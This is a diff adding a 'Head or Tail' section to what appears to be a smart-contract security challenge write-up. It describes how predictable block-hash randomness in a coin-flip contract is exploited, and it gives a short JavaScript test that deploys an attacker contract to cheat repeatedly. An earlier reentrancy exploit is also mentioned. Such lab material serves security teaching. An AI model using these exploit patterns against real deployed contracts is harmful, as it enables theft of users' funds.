@@ -93,3 +93,35 @@ Here's how you can write the exploit in the Exploit section:
 
 - **Exploit**: Bob deploys a contract ReentersBob that utilizes a reentrancy attack via the withdraw function of ReenterPool. The attack allows Bob's contract to repeatedly withdraw ETH from Alice's pool before updating the balance.
 
+---
+
+## Challenge 4
+
+### Head or Tail
+
+ The HeadOrTail contract has a vulnerability where the randomness is derived from global variables, making it predictable. you can follow these steps in the rehead-or-tails.js test file:
+
+#### *Steps to Exploit*
+
+- The `HeadOrTail.sol` contract implements a coin flip game where the outcome is determined based on the previous block's hash. This method of generating randomness is predictable and can be exploited.
+
+#### *Exploit Code*
+Here's how you can write the exploit in the Exploit section:
+
+```javascript
+ it("Exploit", async function () {
+    /** CODE YOUR EXPLOIT HERE  */
+    const Attacker = await ethers.getContractFactory("BobsGuess", bob);
+
+    this.attacker = await Attacker.deploy();
+    for (let i = 0; i < 5; i++) {
+      this.attacker.connect(bob).cheat(this.headOrTale.address);
+    }
+  });
+```
+
+#### *Explanation*
+- **Setup**: Initializes Alice and Bob as signers and deploys the HeadOrTail contract. Ensures the initial wins count is 0.
+
+- **Exploit**: Bob deploys a contract that predicts the outcome of the coin flip by calculating the block hash and determining the result before calling the flip function.
+
